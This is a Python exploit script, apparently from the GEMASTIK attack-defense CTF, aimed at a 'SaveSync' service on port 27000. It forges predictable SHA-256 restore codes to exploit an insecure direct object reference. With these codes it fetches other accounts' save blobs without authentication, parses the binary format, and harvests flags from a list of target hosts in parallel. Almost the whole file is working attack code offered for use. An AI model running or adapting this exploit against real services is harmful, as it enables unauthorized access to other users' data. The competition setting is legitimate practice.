#!/usr/bin/env python3
"""SaveSync (port 27000) — restore-code IDOR farm.

Bug: /sync/restore?code=<sha256("s4v3sync::r3st0r3::v1::9a3f1c:<accountId>")[:16]>
     returns any account's save blob without auth. Checker account id = 1337,
     flag lives in the save 'note' field. Non-blocking, budget-capped, SLA-safe.
"""
import hashlib, json, urllib.request, base64, struct, sys, os, re, concurrent.futures

FLAG_RE = None
HERE = os.path.dirname(os.path.abspath(__file__))

def read_targets():
    ad = os.path.join(os.environ["HOME"], "GEMASTIK/GEMASTIK/toolkit/ctf-toolkit/attack_defense")
    path = os.path.join(ad, "targets.txt")
    out = []
    for line in open(path):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(None, 2)
        if len(parts) >= 2:
            out.append((parts[0], int(parts[1])))
    return out

def code_for(aid):
    return hashlib.sha256(f"s4v3sync::r3st0r3::v1::9a3f1c:{aid}".encode()).digest()[:16].hex()

def get_note(host, port, aid=1337, timeout=6):
    url = f"http://{host}:{port}/sync/restore?code={code_for(aid)}"
    r = json.load(urllib.request.urlopen(url, timeout=timeout))
    b = base64.b64decode(r["blob"])
    p = 44
    nl = b[p]; p += 1 + nl
    p += 4 + 8
    gl = b[p]; p += 1 + gl
    nlen = struct.unpack("<H", b[p:p+2])[0]; p += 2
    return b[p:p+nlen].decode(errors="replace")

def one(t):
    host, port = t[0], 27000
    try:
        note = get_note(host, port)
        flags = re.findall(r"GEMASTIK\{[^}\s]{8,64}\}", note)
        return (host, flags)
    except Exception:
        return (host, [])

if __name__ == "__main__":
    FLAG_RE = re.compile(r"GEMASTIK\{[^}\s]{8,64}\}")
    targets = read_targets()
    print(f"[*] {len(targets)} targets")
    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
        for host, flags in ex.map(one, targets):
            if flags:
                print(f"[+] {host}: {flags}")
                found += flags
    q = os.path.join(HERE, "savesync_flags.txt")
    with open(q, "a") as f:
        for fl in set(found):
            f.write(fl + "\n")
    print(f"[*] total {len(set(found))} unique flags -> {q}")
